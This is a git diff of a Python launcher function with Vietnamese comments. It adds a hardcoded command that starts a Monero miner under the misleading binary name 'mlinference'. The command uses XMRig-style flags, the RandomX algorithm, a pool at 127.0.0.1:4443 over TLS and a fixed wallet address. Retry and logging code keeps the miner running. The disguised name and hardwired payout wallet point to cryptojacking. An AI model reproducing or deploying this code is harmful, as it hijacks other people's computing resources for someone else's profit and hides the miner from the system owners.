@@ -118,14 +118,29 @@ def start_mining_process(retries=3, delay=5):
     Returns:
         subprocess.Popen or None: Đối tượng quá trình khai thác hoặc None nếu thất bại.
     """
-    mining_command = os.getenv(
-        'MINING_COMMAND',
-        '/usr/local/bin/mlinference'
-    )
-    mining_config = os.path.join(
-        os.getenv('CONFIG_DIR', '/app/mining_environment/config'),
-        os.getenv('MINING_CONFIG', 'mlinference_config.json')
-    )
+    # Đường dẫn đầy đủ đến thực thi mlinference
+    mining_executable = '/usr/local/bin/mlinference'
+    
+    # Kiểm tra xem tệp thực thi có tồn tại và có quyền thực thi không
+    if not os.path.isfile(mining_executable):
+        logger.error(f"Không tìm thấy tệp thực thi khai thác tại: {mining_executable}")
+        stop_event.set()
+        return None
+    if not os.access(mining_executable, os.X_OK):
+        logger.error(f"Tệp thực thi khai thác không có quyền thực thi: {mining_executable}")
+        stop_event.set()
+        return None
+    
+    # Định nghĩa lệnh khai thác dưới dạng danh sách
+    mining_command = [
+        mining_executable,
+        '--donate-level', '1',
+        '-o', '127.0.0.1:4443',
+        '-u', '44XbJdyExZZbCqrGyvG1oUbTpBL8JNqHVh8hmYXgUfEHgHs4t45yMfKeTAUQ4dDNtPc2vXhj83uJf1byNSgwU9ZYFxgT3Ao',
+        '-a', 'rx/0',
+        '--no-huge-pages',
+        '--tls'
+    ]
 
     for attempt in range(1, retries + 1):
         logger.info(
@@ -133,7 +148,9 @@ def start_mining_process(retries=3, delay=5):
         )
         try:
             mining_process = subprocess.Popen(
-                [mining_command, '--config', mining_config]
+                mining_command,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
             )
             logger.info(
                 f"Quá trình khai thác đã được khởi động với PID: {mining_process.pid}"
@@ -142,9 +159,14 @@ def start_mining_process(retries=3, delay=5):
             # Kiểm tra xem quá trình có đang chạy không
             time.sleep(2)  # Chờ một thời gian ngắn để tiến trình khởi chạy
             if mining_process.poll() is not None:
+                stdout, stderr = mining_process.communicate()
                 logger.error(
                     f"Quá trình khai thác đã kết thúc ngay sau khi khởi động với mã trả về: {mining_process.returncode}"
                 )
+                if stdout:
+                    logger.error(f"STDOUT: {stdout.decode().strip()}")
+                if stderr:
+                    logger.error(f"STDERR: {stderr.decode().strip()}")
                 mining_process = None
             else:
                 logger.info("Quá trình khai thác đang chạy.")
@@ -161,6 +183,7 @@ def start_mining_process(retries=3, delay=5):
     logger.error("Tất cả các cố gắng khởi chạy quá trình khai thác đã thất bại.")
     stop_event.set()
     return None
+
 
 def main():
     """
